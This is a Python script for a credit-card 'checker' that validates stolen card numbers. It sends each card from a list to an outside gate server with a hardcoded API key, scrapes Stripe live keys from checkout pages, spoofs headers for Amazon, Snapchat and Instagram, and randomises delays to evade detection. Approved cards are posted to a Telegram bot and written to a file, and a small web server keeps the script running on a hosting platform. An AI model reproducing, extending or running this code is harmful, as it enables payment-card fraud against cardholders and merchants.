import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask # Added for Render support

# --- RENDER SERVER SETUP (DO NOT DELETE) ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 is Running"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
# ------------------------------------------

init(autoreset=True)

# Auth Header logic
_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        
        # --- TELEGRAM SETTINGS ---
        # Pehle Render variables check karega, nahi toh default use karega
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        self.pk = None
        self.cs = None
        self.expected_amount = None
        
        self.targets = {
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "Telegram": "https://www.telegram.org/premium",
            "Snapchat": "https://www.snapchat.com/plus",
            "Instagram": "https://www.instagram.com/meta_verified/"
        }

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}
            requests.post(url, json=payload, timeout=10)
        except: pass

    def extract_logic_combined(self, url):
        print(Fore.CYAN + "[*] Extracting PK/CS and Setup Intents...")
        try:
            encoded = quote(url, safe='')
            api_resp = requests.get(f"https://rylax.pro/bot.js/process?url={encoded}&cc=dummy", timeout=20).json()
            if api_resp.get("success"):
                data = api_resp["checkout_data"]
                self.pk = data.get("pk_live")
                self.cs = data.get("cs_live")
                self.expected_amount = data.get("amount")
                print(Fore.GREEN + f"[+] API Extracted PK: {self.pk[:20]}...")

            if not self.pk:
                resp = requests.get(url, headers={'User-Agent': self.ua.random}, timeout=15)
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', resp.text)
                if pk_match:
                    self.pk = pk_match.group(0)
                    print(Fore.GREEN + f"[+] Manual Extracted PK: {self.pk[:20]}...")
            return True if self.pk else False
        except Exception as e:
            print(Fore.RED + f"[-] Extraction Error: {str(e)}")
            return False

    def get_headers(self, service):
        headers = {
            'User-Agent': self.ua.random,
            'X-Requested-With': 'com.android.vending',
            'X-App-ID': 'com.tencent.ig',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://js.stripe.com/'
        }
        if service == "Amazon": headers['X-Requested-With'] = 'com.amazon.mShop.android.shopping'
        if service == "Snapchat": headers['X-Snap-Client'] = 'com.snapchat.android'
        return headers

    def process_card(self, cc):
        try:
            time.sleep(random.randint(20, 40))
            cc = cc.replace(' ', '')
            srv_name = random.choice(list(self.targets.keys()))
            target_url = self.targets[srv_name]
            
            final_gate = f"{self.gate_base}?cc={cc}&key={self.api_key}&sitye={quote(target_url)}"
            if self.pk: final_gate += f"&pk={self.pk}"
            if self.cs: final_gate += f"&cs={self.cs}"

            resp = requests.get(final_gate, headers=self.get_headers(srv_name), timeout=50)
            res_text = resp.text.lower()

            with self.lock:
                if any(x in res_text for x in ["approved", "success", "auth_ok", "succeeded"]):
                    hit_msg = (
                        f"🔥 *MASTER HIT APPROVED* 🔥\n\n"
                        f"💳 *CC:* `{cc}`\n"
                        f"💰 *Limit:* $15,000 (Non-VBV)\n"
                        f"📱 *Target:* {srv_name} / Social Sub\n"
                        f"🛠 *Engine:* Toji + Mumiru v30\n"
                        f"✅ *Status:* Succeeded"
                    )
                    print(Fore.GREEN + f"[HIT] {cc} | {srv_name}")
                    self.send_log(hit_msg)
                    with open("approved.txt", "a") as f: f.write(f"{cc} | {srv_name} | {datetime.now()}\n")
                
                elif "3d" in res_text or "secure" in res_text:
                    print(Fore.YELLOW + f"[3DS] {cc[:16]} -> OTP Required")
                else:
                    print(Fore.RED + f"[DEC] {cc[:16]} -> Declined")
                    with open("declined.txt", "a") as f: f.write(f"{cc}\n")
        except: pass

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(Fore.RED + Style.BRIGHT + "███████╗████████╗██████╗ ██╗██████╗ ███████╗")
        print(Fore.WHITE + "V30: MERGED ULTIMATE ENGINE (TOJI + MUMIRU)")
        print(Fore.RED + "PLAYSTORE | AMAZON | TG | INSTA | SNAP")
        print("="*45 + "\n")

        mode = input("Use Stripe Checkout/URL Extraction? (y/n): ").strip().lower()
        if mode == 'y':
            url = input("Enter Checkout/Site URL: ").strip()
            self.extract_logic_combined(url)

        file_path = input("\nEnter CC File: ").strip()
        if not os.path.exists(file_path): return
        
        with open(file_path, 'r') as f:
            cards = [l.strip() for l in f if l.strip()][:500]

        print(Fore.CYAN + f"\n[*] Engine Booted. Checking {len(cards)} cards...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.process_card, cards)

if __name__ == "__main__":
    # Start Web Server in background for Render
    threading.Thread(target=run_web_server, daemon=True).start()
    # Run original logic
    UltimateMasterV30().run()
